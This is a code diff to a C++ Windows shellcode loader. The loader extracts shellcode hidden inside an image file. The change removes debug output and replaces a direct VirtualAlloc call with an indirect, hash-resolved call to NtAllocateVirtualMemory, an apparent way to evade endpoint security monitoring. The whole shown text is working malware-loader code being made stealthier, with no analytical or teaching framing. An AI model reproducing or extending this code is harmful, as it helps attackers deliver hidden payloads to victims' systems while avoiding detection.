@@ -186,19 +186,31 @@ BOOL ExtractShellcodeFromImage(LPCWSTR imagePath, PBYTE* shellcode, DWORD* size)
     }
     // 从字节数组中读取大小
     *size = *(DWORD*)size_bytes;
-    DebugPrintA("[DEBUG] Extracted size: %d\n", *size);
-    DebugPrintA("[DEBUG] Size bytes: %02X %02X %02X %02X\n", 
-                size_bytes[0], size_bytes[1], size_bytes[2], size_bytes[3]);
+    // DebugPrintA("[DEBUG] Extracted size: %d\n", *size);
+    // DebugPrintA("[DEBUG] Size bytes: %02X %02X %02X %02X\n", 
+    //             size_bytes[0], size_bytes[1], size_bytes[2], size_bytes[3]);
     
-    // 分配内存
-    *shellcode = (PBYTE)VirtualAlloc(NULL, *size, MEM_COMMIT, PAGE_READWRITE);
-    if (!*shellcode) {
-        delete bitmap;
-        Gdiplus::GdiplusShutdown(gdiplusToken);
-        return FALSE;
-    }
-    // 提取shellcode数据
-    ZeroMemory(*shellcode, *size);
+	PVOID baseAddress = NULL;
+	SIZE_T regionSize = *size;
+	NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(
+		NtAllocateVirtualMemoryStruct.funcAddr,
+		NtAllocateVirtualMemoryStruct.funcHash,
+		(HANDLE)-1,      
+		&baseAddress,    
+		0,               
+		&regionSize,     
+		MEM_COMMIT,      
+		PAGE_READWRITE   
+	);
+
+	if (!NT_SUCCESS(status)) {
+		delete bitmap;
+		Gdiplus::GdiplusShutdown(gdiplusToken);
+		return FALSE;
+	}
+	*shellcode = (PBYTE)baseAddress;
+
+	ZeroMemory(*shellcode, *size);
     byte_idx = 0;
     DWORD data_idx = 0;
     
